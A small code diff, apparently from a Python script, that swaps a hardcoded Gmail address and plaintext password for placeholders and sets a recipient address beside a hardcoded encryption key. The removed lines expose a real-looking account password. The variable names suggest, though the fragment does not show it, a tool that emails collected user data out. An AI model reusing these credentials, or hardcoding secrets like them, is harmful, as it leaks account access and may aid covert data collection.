@@ -61,10 +61,10 @@ number_of_iterations_end = 3
 
 username = getpass.getuser()
 
-email_address = "bingearbour@gmail.com"
-password = "Bingearbour123*"
+email_address = "XYz1234@gmail.com"
+password = "Hola@123*"
 
-toaddr= "bingearbour@gmail.com"
+toaddr= "XYz1234@gmail.com"
 
 key = "6soALznfhsimtmS0OxRXVFdTch2AKdVs5REk0Oxy0dc="
 
